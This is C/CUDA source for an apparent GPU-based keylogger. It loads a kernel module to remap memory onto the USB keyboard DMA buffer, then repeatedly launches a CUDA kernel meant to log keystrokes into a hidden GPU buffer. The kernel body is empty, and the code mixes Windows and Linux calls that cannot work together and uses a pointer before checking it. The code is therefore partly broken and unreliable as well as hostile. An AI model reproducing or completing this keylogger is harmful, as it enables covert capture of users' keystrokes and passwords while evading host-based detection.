

#include <windows.h>
//#include <winbase.h>
//#include <stdio.h>
//#include <kernelspecs.h>
//#include <stdlib.h>
#include <signal.h>
//#include <sys/types.h>
//#include <sys/stat.h>
#include <fcntl.h>
#include <io.h>
//#include <cuda.h>
#include <cuda_runtime.h>
//#include <helper_functions.h>
#include "helper_cuda.h"
#include <cuda_runtime.h>
#include <device_launch_parameters.h>
////#include <unistd.h>
////#include <sys/mman.h>
#include <conio.h>

// define DEBUG to see evidence of keystrokes being logged by the
// GPU, via printf()s emitted by the CUDA kernel 

#define DEBUG 1

//PKTIMER   gTimer;
//PKDPC     gDPCP;
UCHAR     g_key_bits = 0;

// command bytes
#define SET_LEDS        0xED
#define KEY_RESET       0xFF

// responses from keyboard
#define KEY_ACK         0xFA   // ack
#define KEY_AGAIN       0xFE   // send again
// 8042 ports
// When you read from port 60, this is called STATUS_BYTE.
// When you write to port 60, this is called COMMAND_BYTE.
// Read and write on port 64 is called DATA_BYTE.
PUCHAR KEYBOARD_PORT_60 = (PUCHAR)0x60;
PUCHAR KEYBOARD_PORT_64 = (PUCHAR)0x64;

// status register bits
#define IBUFFER_FULL      0x02
#define OBUFFER_FULL      0x01

// flags for keyboard LEDS
#define SCROLL_LOCK_BIT  (0x01 << 0)
#define NUMLOCK_BIT      (0x01 << 1)
#define CAPS_LOCK_BIT    (0x01 << 2)





static unsigned char *v = 0;

void sigint(int a) {
	printf("^C caught...\n");
	if (v) {
		VirtualFree(v, 4096, MEM_RELEASE);
		//munmap(v, 4096);
	}
	printf("Dying.\n");
}

__global__ void l(unsigned char *v,
	unsigned char *ks,
	unsigned long *ki,
	unsigned char *p0,
	unsigned char *p2) {




}


int main(int argc, char *argv[]) {



	int fd;
	unsigned char *d_v, *ks, *p0, *p2;
	unsigned char init0 = 0;
	unsigned long init0long = 0;
	unsigned long *ki;

	signal(SIGINT, sigint);

	// insert kernel module that will find USB keyboard DMA address and
	// remap one of our PTEs to that address
	system("insmod kernel/main.ko");

	Sleep(1);

	fd = open("/dev/kl", O_RDWR);
	if (fd <= 0) {
		printf("Failed to open /dev/kl.\n");
		exit(1);
	}

	// get a single page that will be remapped by the
	// kernel driver
	v = (unsigned char *)VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
	//v = (unsigned char *)mmap(NULL, 4096,		PROT_READ | PROT_WRITE,		MAP_SHARED | MAP_ANONYMOUS,		0, 0);
	v[0] = 1;

	if (v == NULL) { // MAP_FAILED
		perror("Failed to mmap().\n");
		exit(2);
	}

#ifdef DEBUG
	printf("VIRTUAL ADDRESS--> %lx\n", (unsigned long)v);
#endif

	// give kernel driver a userspace virtual address to remap
	write(fd, &v, sizeof(unsigned long));
	close(fd);
	Sleep(2);

	// kernel driver can go away now
	system("rmmod main");

	//
	// v is now remapped to cover USB keyboard DMA buffer, so 
	// set up CUDA kernel to do keystroke logging in GPU
	//

	// use first GPU device
	checkCudaErrors(cudaSetDevice(0));
	checkCudaErrors(cudaSetDeviceFlags(cudaDeviceMapHost));

	// allocate 1GB buffer in device space for storing keystrokes; indexed
	// by ki.  Last keystrokes p0 [modifier keys] and p2 [keystroke] 
	// persist across CUDA kernel invocations to debounce keys
	checkCudaErrors(cudaMalloc(&ki, sizeof(unsigned long)));
	checkCudaErrors(cudaMalloc(&p0, sizeof(unsigned char)));
	checkCudaErrors(cudaMalloc(&p2, sizeof(unsigned char)));
	checkCudaErrors(cudaMalloc(&ks, 1000000000));

	checkCudaErrors(cudaMemcpy(p0, &init0,
		sizeof(unsigned char),
		cudaMemcpyHostToDevice));
	checkCudaErrors(cudaMemcpy(p2, &init0,
		sizeof(unsigned char),
		cudaMemcpyHostToDevice));
	checkCudaErrors(cudaMemcpy(ki, &init0long,
		sizeof(unsigned long),
		cudaMemcpyHostToDevice));

	// map USB keyboard DMA address into GPU address space
	checkCudaErrors(cudaHostRegister(v, 4096, cudaHostRegisterMapped));
	checkCudaErrors(cudaHostGetDevicePointer((void **)&d_v, (void *)v, 0));

	// very simple CUDA kernel--one thread that does nothing but
	// USB keystroke logging
	dim3 grid(1);
	dim3 block(1);
	while (1) {
		l <<<grid, block >>>(d_v, ks, ki, p0, p2);
		checkCudaErrors(cudaDeviceSynchronize());
	}
}



/*
// for testing keystroke detection in userspace--move after
// remap of PTE by kernel driver to test
while (strokes < 100) {
stroke=0;
for (k=0; k < 8 && ! stroke; k++) {
stroke = (((char *)v)[k]);
}
if (stroke) {
strokes++;
for (k=0; k < 8; k++) {
printf("HOST: %d %d %d %d %d %d %d %d\n",
v[0],
v[1],
v[2],
v[3],
v[4],
v[5],
v[6],
v[7]);
}
}
}
*/

